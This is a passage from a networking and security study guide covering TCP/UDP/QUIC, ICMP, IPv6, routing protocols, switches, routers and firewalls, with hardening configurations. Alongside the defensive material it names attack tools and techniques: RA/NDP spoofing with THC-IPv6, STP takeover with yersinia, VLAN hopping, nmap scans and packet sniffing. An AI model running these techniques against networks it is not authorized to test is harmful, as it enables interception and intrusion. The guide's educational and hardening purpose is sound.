Check current algorithm:
  sysctl net.ipv4.tcp_congestion_control
  ss -tin dst 8.8.8.8  # shows cwnd, retrans stats per connection
```

### TCP Keep-Alive

```
Problem: NAT tables and firewalls expire idle connections.
         How does a server know if a client is still there?

Solution: TCP Keep-Alive — periodic probes on idle connections.

Linux defaults:
  tcp_keepalive_time    = 7200s (2 hours! NAT expires in ~5 min)
  tcp_keepalive_intvl   = 75s   (retry interval)
  tcp_keepalive_probes  = 9     (retries before declaring dead)

Fix for cloud/container environments:
  sysctl -w net.ipv4.tcp_keepalive_time=60
  sysctl -w net.ipv4.tcp_keepalive_intvl=10
  sysctl -w net.ipv4.tcp_keepalive_probes=3
  
Wireshark filter to see keep-alives:
  tcp.analysis.keep_alive
  tcp.analysis.keep_alive_ack

Security: Long keep-alive times = NAT/firewall expiry
          means "dead" TCP sessions = connection resets
          = application errors that look like server crashes
```

### SCTP — Stream Control Transmission Protocol

```
SCTP = TCP + UDP combined, rarely used in apps but important
       in telecom and increasingly in cloud.

Feature comparison:
  Feature              TCP    UDP    SCTP
  ─────────────────────────────────────────
  Connection-oriented   ✓      ✗      ✓
  Reliable delivery     ✓      ✗      ✓
  Ordered delivery      ✓      ✗    Optional
  Flow control          ✓      ✗      ✓
  Multi-streaming       ✗      ✗      ✓ (no HOL blocking!)
  Multi-homing          ✗      ✗      ✓ (multiple IPs per assoc)
  Message-oriented      ✗      ✓      ✓
  
Use cases: SS7/Signaling (telecom), Diameter protocol (LTE/5G core),
           SIGTRAN, WebRTC (DTLS-SCTP for data channels)
           
Security: SCTP is often not filtered by firewalls configured
          only for TCP/UDP → can be used for stealthy tunneling
nmap scan for SCTP:
  nmap -sY target  (SCTP INIT scan)
```

---

## 10. UDP Internals & Use Cases

> **Reference:** Basic UDP comparison with TCP covered in `OSI_Model_Deep_Dive.md`, Layer 4.

### Why UDP Wins in Specific Scenarios

```
UDP Header (only 8 bytes vs TCP's 20 bytes):
  Source Port     (2 bytes)
  Destination Port (2 bytes)
  Length          (2 bytes)
  Checksum        (2 bytes)  ← Optional in IPv4, mandatory in IPv6

No handshake, no state, no retransmission.

When this is BETTER than TCP:
  
1. REAL-TIME APPLICATIONS (latency > reliability):
   VoIP/Video calls: A retransmitted frame from 200ms ago is useless.
   Better to show a blurry frame than freeze waiting for retransmit.
   
2. DNS: Single question/answer fits in one datagram. TCP overhead
   is wasteful. (DNS uses TCP only for large responses > 512 bytes
   or zone transfers)

3. DHCP: Client has no IP yet — can't form TCP connection.
   Broadcast-based discovery requires UDP.

4. QUIC (HTTP/3): Google's QUIC runs UDP + implements reliability
   in userspace. TLS 1.3 built-in. Faster than TCP+TLS.

5. TFTP, SNMP, NTP: Simple request/response — TCP is overkill.
   
6. Tunneling: WireGuard VPN uses UDP. Faster, simpler than TCP tunnels.

UDP in cloud:
  AWS: ELB target groups support UDP (for NTP, DNS, gaming servers)
  GCP: UDP load balancing via Network Load Balancer
  Kubernetes: UDP services supported but harder to health-check
```

### QUIC & HTTP/3 — The Future of Web Transport

```
HTTP/1.1 over TCP:
  Connection 1: Request A → Response A → Request B → Response B
  HOL blocking: Request B waits for Request A to complete

HTTP/2 over TCP:
  Multiplexed streams on ONE TCP connection
  Still HOL blocked at TCP level (one lost segment blocks all streams)
  
HTTP/3 over QUIC (UDP):
  Each stream is independent — lost UDP datagram only blocks that stream
  Built-in TLS 1.3 — 0-RTT connection establishment
  Connection migration — change IPs without reconnecting
  (switch from WiFi to 4G seamlessly)

Performance:
  HTTP/3 is ~15–20% faster on lossy networks
  0-RTT resumes connections instantly (vs 1–3 RTT for TLS 1.3)
  
Security implications:
  UDP port 443 must be open for HTTP/3
  Many enterprise firewalls block UDP/443 → browser falls back to H/2
  QUIC uses connection IDs, not 5-tuples → harder to track/filter
  0-RTT replay attacks are possible (mitigated by application logic)

Test if a site supports HTTP/3:
  curl --http3 -I https://cloudflare.com
  # Or check: alt-svc: h3=":443" in response headers
```

---

## 11. ICMP — More Than Just Ping

### Layman's Terms
ICMP is the **error reporting and diagnostics service** of TCP/IP. When something goes wrong (host unreachable, TTL expired, packet too big), ICMP sends a "sorry, couldn't deliver your message" notification. It's also used for tools you use every day: ping and traceroute.

### ICMP Message Types Reference

```
Type 0:  Echo Reply               ← Response to ping
Type 3:  Destination Unreachable  ← Many sub-codes (see below)
Type 4:  Source Quench            ← Deprecated congestion signal
Type 5:  Redirect                 ← "Use this gateway instead" ← ATTACK VECTOR
Type 8:  Echo Request             ← Ping
Type 9:  Router Advertisement     ← IRDP (deprecated)
Type 10: Router Solicitation      ← IRDP (deprecated)
Type 11: Time Exceeded            ← TTL = 0 (how traceroute works!)
Type 12: Parameter Problem        ← Bad IP header
Type 13: Timestamp Request
Type 14: Timestamp Reply

Type 3 Destination Unreachable sub-codes:
  Code 0: Net Unreachable
  Code 1: Host Unreachable
  Code 2: Protocol Unreachable   ← Port scanner gets this for UDP
  Code 3: Port Unreachable       ← UDP port closed
  Code 4: Fragmentation Needed   ← MTU Path Discovery uses this
  Code 13: Communication Administratively Prohibited ← Firewall dropped it
```

### How Traceroute Actually Works

```
traceroute 8.8.8.8

Sends UDP (Linux) or ICMP (Windows) packets with increasing TTL:

Hop 1: TTL=1 → Router1 decrements to 0 → sends back ICMP Type 11
        "Time Exceeded" from 192.168.1.1 → we know hop 1 = 192.168.1.1

Hop 2: TTL=2 → Router1 passes to Router2 (TTL now 1)
        Router2 decrements to 0 → ICMP Type 11 from 10.0.0.1 → hop 2

Hop 3: TTL=3 → reaches 8.8.8.8 → ICMP Type 0 Echo Reply (or
        Port Unreachable for UDP probes) → destination reached!

Security uses:
  - Map network topology before attack
  - Identify firewall positions (hop where TTL reply stops = firewall)
  - Detect load balancers (different IPs at same hop number)
  
tcptraceroute — sends TCP SYN instead of UDP/ICMP:
  sudo apt install tcptraceroute
  sudo tcptraceroute 8.8.8.8 443
  (bypasses firewalls that block ICMP traceroute)
```

### Path MTU Discovery (PMTUD)

```
Problem: Different network segments have different MTUs:
  Ethernet: 1500 bytes
  PPPoE DSL: 1492 bytes
  VPN tunnels: ~1400 bytes (tunnel headers reduce payload capacity)
  
PMTUD solves this:
  1. Sender sets DF (Don't Fragment) bit in IP header
  2. If packet too big for intermediate link:
     Router drops it, sends ICMP Type 3 Code 4:
     "Fragmentation Needed, MTU = 1400"
  3. Sender reduces packet size to 1400 and retries
  
PMTUD Black Hole:
  Firewall blocks ICMP → Sender never learns the MTU
  → TCP sessions hang for HTTPS but not HTTP
    (HTTP data fits in 1500, HTTPS handshake data larger)
  
Diagnosis:
  ping -M do -s 1400 8.8.8.8  (Linux: test specific size, DF set)
  ping -f -l 1400 8.8.8.8     (Windows)
  
Fix on Linux:
  # Clamp TCP MSS to PMTU (fixes black holes):
  iptables -A FORWARD -p tcp --tcp-flags SYN,RST SYN \
    -j TCPMSS --clamp-mss-to-pmtu
```

---

## 12. IPv6 — Architecture, Security & Migration

### Layman's Terms
IPv6 is the **new generation postal code system** for the internet. IPv4 addresses (like 192.168.1.1) ran out — there are only ~4.3 billion, and the internet has more devices than that. IPv6 uses 128-bit addresses — enough for every atom on Earth to have trillions of addresses. But the security model is **fundamentally different** from IPv4.

### IPv6 Address Structure

```
IPv6 Address: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
              ─────────────────────────────────────────
              8 groups of 4 hex digits = 128 bits

Abbreviation rules:
  1. Leading zeros in group can be omitted:
     0000 → 0,  00a3 → a3
  2. One sequence of consecutive all-zero groups → ::
     2001:0db8:0000:0000:0000:0000:0370:7334
     → 2001:db8::370:7334

Address types:
  2000::/3       = Global Unicast (public internet, like IPv4 public)
  fc00::/7       = Unique Local (like RFC1918 private, but routable in org)
  fe80::/10      = Link-Local (auto-configured, not routable, only on-link)
  ff00::/8       = Multicast (replaces broadcast!)
  ::1            = Loopback (like 127.0.0.1)
  
Key difference: NO BROADCAST in IPv6. Everything is multicast.
  ff02::1  = All nodes on link
  ff02::2  = All routers on link
  ff02::5  = OSPF routers
  ff02::fb = mDNS
```

### IPv6 Neighbor Discovery Protocol (NDP) — ARP's Replacement

```
NDP replaces ARP, ICMP redirect, and router discovery in IPv6.

NDP Message Types (ICMPv6):
  Type 133: Router Solicitation  (RS)  ← "Are there routers here?"
  Type 134: Router Advertisement (RA)  ← "Yes! Use me as gateway"
  Type 135: Neighbor Solicitation (NS)  ← Like ARP Request
  Type 136: Neighbor Advertisement (NA) ← Like ARP Reply
  Type 137: Redirect               ← "Use this better next-hop"

SLAAC — Stateless Address AutoConfiguration:
  1. Interface creates Link-Local: fe80::<EUI-64 from MAC>
  2. Sends Router Solicitation → Router sends RA
  3. RA contains: prefix (e.g., 2001:db8::/64), default gateway
  4. Host builds global address: prefix + EUI-64 from MAC
  
No DHCP needed! But no logging either (SLAAC addresses not in DHCP logs)

EUI-64 from MAC (Privacy issue):
  MAC:  00:1A:2B:3C:4D:5E
  → Insert FF:FE in middle: 00:1A:2B:FF:FE:3C:4D:5E
  → Flip 7th bit: 02:1A:2B:FF:FE:3C:4D:5E
  → EUI-64: 021a:2bff:fe3c:4d5e
  
Problem: Your MAC is embedded in your IPv6 address → tracking!
RFC 4941 Privacy Extensions: use random addresses for outbound connections
```

### IPv6 Security Differences from IPv4

```
Security aspects unique to IPv6:

1. NO NAT (by design) → Every device has a routable public address
   → Firewall rules are MANDATORY (NAT no longer provides implicit blocking)
   → All RFC1918 "security by obscurity" is gone

2. ICMPv6 CANNOT be fully blocked (unlike IPv4 ICMP):
   - NDP requires ICMPv6 Types 133-137
   - PMTUD requires Type 2 (Packet Too Big)
   - Blocking all ICMPv6 breaks IPv6 networking
   
3. DUAL STACK ATTACKS:
   If a host has both IPv4 and IPv6, and your firewall only
   protects IPv4, the IPv6 path is completely unprotected!
   
4. RA SPOOFING (equivalent to rogue DHCP + default route poisoning):
   Attacker sends forged Router Advertisement:
   → All hosts update their default gateway to attacker
   → Attacker becomes MITM for all traffic
   Tool: fake_router6, parasite6 (from THC-IPv6)

5. NDP SPOOFING (IPv6 ARP poisoning):
   Forge Neighbor Advertisements → redirect traffic
   Tool: parasite6

6. TRANSITION MECHANISM ATTACKS:
   6to4, Teredo, ISATAP tunnels create IPv6 connectivity THROUGH
   IPv4-only networks — bypassing IPv4-only firewalls completely!

Detection and hardening:
  - Enable RA Guard on managed switches (RFC 6105)
  - Enable DHCPv6 Guard (if using DHCPv6)
  - Use NDPmon to detect rogue RAs
  - Ensure firewall rules cover BOTH IPv4 and IPv6
  - Log IPv6 traffic separately (it's often invisible in SIEM)
```

---

## 13. Routing Protocols Deep Dive

### Routing Protocol Classification

```
              Routing Protocols
                     │
        ┌────────────┴────────────┐
     Static              Dynamic Routing
     Routes               Protocols
                              │
              ┌───────────────┴──────────────┐
             IGP                            EGP
    (Interior Gateway)            (Exterior Gateway)
           │                              │
    ┌──────┴──────┐                      BGP
 Distance    Link-State              (internet's
  Vector                              backbone)
    │              │
  RIP, EIGRP    OSPF, IS-IS
```

### OSPF — Open Shortest Path First

```
Type: Link-State, Interior Gateway Protocol
Algorithm: Dijkstra's SPF (Shortest Path First)
Metric: Cost (based on bandwidth: cost = 100Mbps / interface_bw)
Administrative Distance: 110

How OSPF works:
1. Neighbor discovery via Hello packets (multicast 224.0.0.5)
2. Elect DR/BDR (Designated Router) on multi-access segments
3. Exchange Link State Advertisements (LSAs) → LSDB (topology map)
4. Run Dijkstra → compute shortest path to every network
5. Install best routes in routing table

OSPF LSA Types (critical for security):
  Type 1: Router LSA (intra-area router links)
  Type 2: Network LSA (DR-generated for multi-access)
  Type 3: Summary LSA (ABR inter-area routes)
  Type 4: ASBR Summary LSA
  Type 5: External LSA (routes from outside OSPF, e.g. from BGP)
  Type 7: NSSA External LSA (for stub areas)

Security vulnerabilities:
  - No auth by default → any router can inject LSAs
  - OSPF MD5 auth exists but uses weak MD5
  - OSPF SHA256 auth available in OSPFv3 (IPv6)
  - Type 5 LSA injection can redirect all internet traffic
    through attacker's router

Enable OSPF MD5 auth (Cisco IOS):
  router ospf 1
   area 0 authentication message-digest
  interface fa0/0
   ip ospf message-digest-key 1 md5 SECRETKEY
```

### BGP — Border Gateway Protocol

```
Type: Path-Vector, Exterior Gateway Protocol
Port: TCP 179
Administrative Distance: 20 (eBGP), 200 (iBGP)

BGP is the routing protocol of the ENTIRE INTERNET.
~900,000 routes in the global BGP table (2024).
Every ISP, cloud provider, and large enterprise uses BGP.

BGP Attributes (how routes are selected):
  1. WEIGHT (Cisco-proprietary, highest wins, not sent to neighbors)
  2. LOCAL_PREF (highest wins, sent within AS)
  3. Locally Originated (prefer routes originated by this router)
  4. AS_PATH (shortest wins — primary inter-AS metric)
  5. ORIGIN (IGP < EGP < incomplete)
  6. MED (lowest wins — hint to neighbors for entry point)
  7. eBGP over iBGP
  8. Lowest IGP metric to next-hop
  9. Lowest Router-ID wins

BGP Security — The Most Dangerous Protocol:
  Anyone with a BGP router can announce ANY prefix.
  No built-in verification of IP ownership.
  
BGP Hijacking:
  Attacker announces 192.0.2.0/24 (owned by victim)
  More specific than victim's /22 aggregate → wins everywhere
  Traffic intended for victim → flows to attacker
  
Real events:
  2010: China Telecom hijacked 50,000 IP prefixes for 18 min
  2018: Mastercard, Visa, banks traffic routed via Russia (myGlobeCom)
  2019: Google Cloud traffic hijacked via Nigeria (MTN)
  2022: Multiple cryptocurrency platforms hijacked before DNS attacks
  
Defenses:
  RPKI (Resource Public Key Infrastructure):
    - Cryptographically binds IP prefixes to ASNs
    - Route Origin Authorization (ROA) records
    - Routers with RPKI validate origin before accepting route
    
  BGP communities: tag routes for policy enforcement
  Maximum prefix limits: reject neighbors advertising too many prefixes
  Peer filtering: only accept prefixes you expect from each peer
  
Check RPKI status:
  rpki.cloudflare.com
  bgp.tools (excellent BGP analysis tool)
```

---

## 14. TCP/IP Attack Surface Unique to This Model

These attacks are specific to TCP/IP mechanics not covered in the OSI file:

### QUIC/HTTP3 Attacks

```
1. UDP Amplification via QUIC:
   QUIC's Initial packets can be used in reflection attacks
   Mitigation: Address Validation tokens (required by RFC 9000)
   
2. 0-RTT Replay Attacks:
   QUIC/TLS 1.3 0-RTT data can be replayed by network attacker
   Mitigation: Application must make 0-RTT requests idempotent
   
3. Connection Migration Abuse:
   Attacker sends CID Update to hijack QUIC connection
   Mitigation: PATH_CHALLENGE/PATH_RESPONSE validation
```

### TCP/IP Fingerprinting (OS Detection)

```
Different OSes have different TCP/IP stack implementations.
Nmap fingerprints:
  - Initial TTL (Windows=128, Linux=64)
  - TCP Window Size (Linux=5840-29200, Windows=8192-65535)
  - TCP Options order in SYN packets
  - IP ID field behavior (incremental, random, zero)
  - DF bit behavior
  - RST data handling
  
Passive fingerprinting (no packets sent, just observe):
  p0f: passive OS fingerprint tool
  sudo p0f -i eth0 -p
  
Active fingerprinting:
  sudo nmap -O 192.168.1.100
  
Evasion: Use tools like tcprewrite to change packet fields
         Some firewalls normalize packets to prevent fingerprinting
```

---

# SECTION 2: NETWORK DEVICES DEEP DIVE

---

## 15. Hubs

### Layman's Terms
A hub is the **dumbest device in networking** — it just shouts everything at everyone. If it receives a signal on port 1, it blasts that same signal out every other port. No intelligence, no filtering, no addressing. Just amplification and repetition.

### Formal Definition
A network hub is a Layer 1 (Physical Layer) multi-port repeater that regenerates and broadcasts incoming electrical signals to all connected ports regardless of the intended destination. All connected devices share the same collision domain.

### Mechanism

```
Hub (4-port):
          PC-A sends frame to PC-B
          
  PC-A ──►│Port 1│──────────────────►│Port 2│──► PC-B (receives it)
           │      │──────────────────►│Port 3│──► PC-C (receives it too!)
           │      │──────────────────►│Port 4│──► PC-D (receives it too!)
           └──────┘
           
Collision domain: ALL 4 devices share bandwidth.
If PC-A and PC-C transmit simultaneously → COLLISION
CSMA/CD handles collisions → devices back off, retry

Bandwidth:
  100Mbps hub = 100Mbps SHARED among all ports
  100Mbps switch = 100Mbps PER PORT (full-duplex)
```

### Why Hubs Matter for Security (Still)

```
Hubs are DEAD in production networks, BUT:

1. Network taps and SOC tools simulate "hub behavior"
   to capture all traffic for analysis (see Section 28)

2. Old IoT/industrial environments still use hubs

3. If an attacker can insert a hub in-line, they see ALL traffic
   (no ARP spoofing needed — physics gives it to them)

4. Wireless networks behave like hubs at L2:
   All devices on same Wi-Fi channel share the medium
   → Wireshark in monitor mode = same as hub-based sniffing
   
5. Promiscuous mode on NIC:
   On a hub network, set NIC to promiscuous mode and you receive
   EVERY frame on the segment (not just yours):
   sudo ip link set eth0 promisc on
   sudo tcpdump -i eth0 -e  (see all MACs)
```

---

## 16. Switches

### Layman's Terms
A switch is a **smart postal worker** that memorizes which desk (MAC address) is at which cubicle (port). When a letter (frame) arrives, instead of giving everyone a copy, it looks up the address in its notebook (MAC address table / CAM table) and delivers it directly to the right cubicle.

### Formal Definition
A network switch is a Layer 2 (Data Link Layer) device that forwards Ethernet frames based on MAC addresses stored in a Content-Addressable Memory (CAM) table. Each port is an independent collision domain; all ports on the same VLAN share one broadcast domain.

### Switch Internal Architecture

```
CAM Table (Content-Addressable Memory / MAC Address Table):
┌──────────────────┬──────┬─────────┬─────────────┐
│   MAC Address    │ Port │  VLAN   │  Age (sec)  │
├──────────────────┼──────┼─────────┼─────────────┤
│ AA:BB:CC:DD:EE:01│  1   │  VLAN10 │     45      │
│ AA:BB:CC:DD:EE:02│  3   │  VLAN10 │    120      │
│ AA:BB:CC:DD:EE:03│  7   │  VLAN20 │     10      │
└──────────────────┴──────┴─────────┴─────────────┘
Age-out: entries expire after 300 seconds (default)

Frame forwarding decisions:
  KNOWN UNICAST:   Look up dst MAC → forward to specific port
  UNKNOWN UNICAST: dst MAC not in table → FLOOD to all ports in VLAN
  BROADCAST:       dst = FF:FF:FF:FF:FF:FF → flood to all ports in VLAN
  MULTICAST:       Flood unless IGMP snooping enabled
```

### VLANs — Virtual Local Area Networks

```
VLANs divide one physical switch into multiple logical switches.
Each VLAN = separate broadcast domain.

Without VLANs:
  All devices on switch → same broadcast domain
  HR, Finance, Engineering all see each other's broadcasts
  ARP floods hit everyone → performance + security issue

With VLANs:
  VLAN 10: HR        (ports 1-8)
  VLAN 20: Finance   (ports 9-16)
  VLAN 30: Engineering (ports 17-24)
  
802.1Q VLAN Tagging:
  Normal Ethernet frame:  [Dst MAC][Src MAC][EtherType][Data][FCS]
  Tagged Ethernet frame:  [Dst MAC][Src MAC][0x8100][TCI][EtherType][Data][FCS]
                                                        ↑
                                            Tag Control Info (12-bit VLAN ID)
                                            VLAN ID: 1–4094 (0 and 4095 reserved)
                                            PCP: 3-bit priority (802.1p QoS)

Access port: carries traffic for ONE VLAN, strips tag before sending to end device
Trunk port:  carries traffic for MULTIPLE VLANs, keeps 802.1Q tags

Native VLAN:  Traffic on trunk port WITHOUT a VLAN tag = native VLAN
              Default = VLAN 1 (NEVER use VLAN 1 in production — too many defaults)
              
VLAN Hopping attack: Double-tag a frame with two VLAN tags:
  Outer tag: Native VLAN (stripped by first switch)
  Inner tag: Target VLAN (still present, second switch forwards it)
  
Fix: Set native VLAN to an unused, dedicated VLAN (e.g., VLAN 999):
  switchport trunk native vlan 999
```

### Spanning Tree Protocol (STP) Deep Dive

```
Problem: Redundant switch links = Layer 2 loops
         Broadcast storm: ARP → flood → flood → flood (infinitely)
         
STP Solution: Block redundant paths, activate only on failure

STP Election Process:
  1. Elect Root Bridge: lowest Bridge ID (priority + MAC)
     Default priority: 32768 (all switches the same = MAC decides)
     
  2. Each non-root switch finds its Root Port:
     Port with lowest cost to Root Bridge
     Cost: 10G=2, 1G=4, 100M=19, 10M=100
     
  3. Each segment elects a Designated Port:
     Port on segment with lowest cost to root
     
  4. All other ports → BLOCKING state (no data, receives BPDUs only)

STP Port States:
  BLOCKING   → 20 sec  (listens for BPDUs, no data)
  LISTENING  → 15 sec  (transitional)
  LEARNING   → 15 sec  (builds MAC table, no data forwarding)
  FORWARDING → active  (normal operation)
  DISABLED            (admin shutdown)
  
  Total convergence time: up to 50 seconds!
  
RSTP (802.1w) — Rapid STP:
  Convergence < 1 second
  New port roles: Alternate Port (immediate backup for Root Port)
                  Backup Port (backup for Designated Port)

STP Attack (BPDU manipulation):
  Send BPDUs with priority 0 → become Root Bridge
  All traffic reroutes through attacker → MITM
  
  sudo apt install yersinia
  sudo yersinia -G  (GUI for STP attacks)
  
  Defense:
    BPDU Guard: auto-shutdown port that receives BPDUs (on access ports)
    switchport spanning-tree bpduguard enable
    Root Guard: prevent downstream switch from becoming root
    spanning-tree guard root
```

### Layer 3 Switches vs Routers

```
L3 Switch = Switch with routing capability (ASIC-based, wire speed)
Router = General purpose routing (software-based, more flexible)

L3 Switch advantages:
  - Routes at wire speed (hardware ASIC)
  - Cheaper for intra-campus routing
  - Inter-VLAN routing without external router ("router on a stick")
  - Supports OSPF, BGP, PBR
  
Router advantages:
  - WAN interface support (DSL, T1, Serial)
  - More advanced NAT
  - Policy-Based Routing (PBR) flexibility
  - IOS feature richness
  
Inter-VLAN routing (Router-on-a-Stick):
  Physical router with ONE trunk port, subinterfaces per VLAN:
  interface fa0/0.10
   encapsulation dot1q 10
   ip address 192.168.10.1 255.255.255.0
  interface fa0/0.20
   encapsulation dot1q 20
   ip address 192.168.20.1 255.255.255.0
```

### Switch Security Configuration Reference

```bash
# Cisco IOS switch hardening (key commands)

# Port security — limit MACs per port
interface fa0/1
 switchport mode access
 switchport access vlan 10
 switchport port-security maximum 2
 switchport port-security violation restrict  # or shutdown/protect
 switchport port-security mac-address sticky  # learn and lock MACs
 spanning-tree portfast                       # skip STP listening/learning
 spanning-tree bpduguard enable               # protect against STP attacks
 storm-control broadcast level 20            # block broadcast > 20% bandwidth

# DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20
no ip dhcp snooping information option
interface fa0/24  # uplink/trusted port
 ip dhcp snooping trust

# Dynamic ARP Inspection
ip arp inspection vlan 10,20
interface fa0/24
 ip arp inspection trust

# 802.1X port authentication
aaa new-model
aaa authentication dot1x default group radius
dot1x system-auth-control
interface fa0/1
 authentication port-control auto
 dot1x pae authenticator
```

---

## 17. Routers

### Layman's Terms
A router is the **border customs officer** between countries (networks). When a package (packet) wants to travel from France (192.168.1.0/24) to Germany (10.0.0.0/24), the customs officer decides which route to send it through, checks passports (routing table), and stamping/forwarding it to the next checkpoint.

### Formal Definition
A router is a Layer 3 (Network Layer) device that forwards IP packets between different networks based on destination IP addresses and routing table entries. It makes independent forwarding decisions for each packet and connects networks with different Layer 2 technologies.

### Router Architecture (Cisco IOS Reference)

```
Router Components:
  RAM:    Running config, routing table, ARP cache, packet buffer
  NVRAM:  Startup configuration (saved config)
  Flash:  IOS image storage
  ROM:    Bootstrap, POST, mini-IOS (rommon)
  CPU:    Packet processing (software forwarding path)
  
Forwarding Paths (slowest to fastest):
  Process Switching: CPU handles every packet (legacy)
  Fast Switching: First packet via CPU, rest via cache (CEF predecessor)
  CEF (Cisco Express Forwarding): Hardware FIB, near wire-speed
  
FIB vs RIB:
  RIB (Routing Information Base) = routing table (all routes, all protocols)
  FIB (Forwarding Information Base) = optimized RIB for hardware lookup
```

### Router Security — Interface Hardening

```bash
# Cisco IOS router hardening checklist

# Disable unnecessary services
no service tcp-small-servers
no service udp-small-servers
no ip finger
no ip http server         # Disable HTTP management
no cdp run                # Disable CDP on edge routers
no ip source-route        # Disable source routing (IP spoofing vector)

# Control plane protection (protect router's CPU)
ip access-list extended MGMT-ACCESS
 permit tcp 10.0.1.0 0.0.0.255 any eq 22  # SSH from mgmt only
 deny tcp any any eq 23                    # Block Telnet
 deny tcp any any eq 80                    # Block HTTP
 permit ip any any

control-plane
 service-policy input MGMT-ACCESS

# Unicast Reverse Path Forwarding (uRPF) — anti-spoofing
interface fa0/0
 ip verify unicast source reachable-via rx  # Drop if src IP not in routing table

# ACL on internet-facing interface
interface fa0/0  # internet-facing
 ip access-group ANTI-SPOOF in

ip access-list extended ANTI-SPOOF
 deny ip 10.0.0.0 0.255.255.255 any      # Block RFC1918 from internet
 deny ip 172.16.0.0 0.15.255.255 any
 deny ip 192.168.0.0 0.0.255.255 any
 deny ip 127.0.0.0 0.255.255.255 any     # Block loopback
 deny ip 169.254.0.0 0.0.255.255 any     # Block APIPA
 deny ip 224.0.0.0 15.255.255.255 any    # Block multicast as source
 permit ip any any
```

---

## 18. Firewalls

### Layman's Terms
A firewall is the **security guard + ID checker + X-ray machine** at an airport. It checks who's coming in and going out, verifies credentials (rules), inspects baggage (packet inspection), and keeps a list of everyone who should or shouldn't be allowed in (policy).

### Firewall Generations — Evolution

```
Generation 1: Packet Filtering Firewall (1988)
  Works at L3/L4. Checks: src IP, dst IP, src port, dst port, protocol
  Stateless: each packet checked independently
  Can't detect: fragmented attacks, protocol abuse, application attacks
  
  Example iptables rule:
  iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
  iptables -A INPUT -p tcp --dport 22 -j DROP

Generation 2: Stateful Inspection Firewall (1994 — Check Point)
  Tracks connection state table (like NAT table)
  Knows: this packet belongs to an ESTABLISHED connection
  Can block: packets not part of any known session
  
  State table example:
  | Src IP:Port    | Dst IP:Port    | State       | Protocol |
  | 10.0.0.5:54231 | 8.8.8.8:443   | ESTABLISHED | TCP      |
  | 10.0.0.6:68    | 255.255.255:67 | NEW         | UDP      |
  
  "Inside-out" rule: only responses to outbound connections allowed in

Generation 3: Application Layer Firewall / Proxy Firewall (1990s)
  Understands L7 protocols
  Can inspect: HTTP methods, URL patterns, DNS query types
  Can detect: HTTP tunneling over port 80, protocol anomalies
  
Generation 4: NGFW — Next-Generation Firewall (2007 — Palo Alto)
  All previous + Deep Packet Inspection (DPI)
  Features:
    - Application identification (App-ID) regardless of port
    - User identity mapping (User-ID via Active Directory)
    - SSL/TLS inspection (decrypt, inspect, re-encrypt)
    - Intrusion Prevention (IPS) engine built-in
    - URL categorization/filtering
    - Threat intelligence feeds
    - Sandboxing (WildFire, Cortex)
    
Generation 5: Cloud-Native Firewall / FWaaS (2015+)
  Distributed, stateless design for cloud environments
  Examples: AWS Security Groups, Azure NSG, Palo Alto Prisma, Zscaler
  No physical appliance — policy enforcement at cloud layer
```

### Firewall Zones Architecture

```
Classic DMZ Architecture:

INTERNET
    │
    ├── [External Interface]
    │         FIREWALL
    ├── [DMZ Interface]
    │         │
    │    ┌────┴────┐
    │    │   DMZ   │  ← Public-facing servers
    │    │ (192.168.2.0/24)
    │    │ Web Server: .10
    │    │ Mail Server: .11
    │    │ DNS Server:  .12
    │    └─────────┘
    │
    ├── [Internal Interface]
              │
         ┌────┴────┐
         │Internal │  ← Employees, sensitive systems
         │ Network │
         │ (10.0.0.0/24)
         └─────────┘

Zone-based policy (Cisco IOS Zone-Based Firewall):
  zone security OUTSIDE
  zone security DMZ
  zone security INSIDE

  zone-pair security OUT-to-DMZ source OUTSIDE destination DMZ
   service-policy type inspect OUT-DMZ-POLICY

  Policy rules:
    OUTSIDE → DMZ:    Allow HTTP/HTTPS/SMTP to specific servers
    DMZ → OUTSIDE:    Allow established connections + DNS
    INSIDE → DMZ:     Allow all (admins manage servers)
    INSIDE → OUTSIDE: Allow HTTP/HTTPS, inspect (stateful)
    OUTSIDE → INSIDE: DENY ALL
    DMZ → INSIDE:     DENY ALL (critical! compromised DMZ server
                       cannot reach internal network)
```

### iptables Deep Dive (Linux Firewall)

```bash
# iptables structure:
# Tables: filter, nat, mangle, raw, security
# Chains: INPUT, OUTPUT, FORWARD (filter table)
#         PREROUTING, POSTROUTING (nat table)

# View rules with line numbers
sudo iptables -L -n -v --line-numbers

# Default policy — DROP everything, then allow specific
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT  # Usually permissive outbound

# Allow established/related (stateful tracking)
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# SSH with rate limiting (anti-brute force)
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Block common attack patterns
# Block NULL scan
sudo iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
# Block Xmas scan
sudo iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
# Block SYN-FIN (invalid)
sudo iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
# Block fragmented packets
sudo iptables -A INPUT -f -j DROP

# Log before drop (for SIEM/analysis)
sudo iptables -A INPUT -j LOG --log-prefix "FIREWALL-DROP: " --log-level 4
sudo iptables -A INPUT -j DROP

# Save rules (Ubuntu)
sudo iptables-save > /etc/iptables/rules.v4

# Modern alternative: nftables
sudo nft add table inet filter
sudo nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }
sudo nft add rule inet filter input ct state established,related accept
sudo nft add rule inet filter input tcp dport 22 accept
```

### nftables — Modern Linux Firewall

```bash
# nftables is the modern replacement for iptables
# Single tool replaces iptables, ip6tables, arptables, ebtables

# Show full ruleset
sudo nft list ruleset

# Create a complete firewall config
cat > /etc/nftables.conf << 'EOF'
#!/usr/sbin/nft -f
flush ruleset

table inet filter {
  chain input {
    type filter hook input priority 0; policy drop;
    
    # Allow loopback
    iif lo accept
    
    # Allow established/related
    ct state established,related accept
    
    # Allow SSH with rate limiting
    tcp dport 22 ct state new limit rate 3/minute accept
    
    # Allow HTTPS
    tcp dport 443 accept
    
    # Allow ICMP (ping)
    ip protocol icmp accept
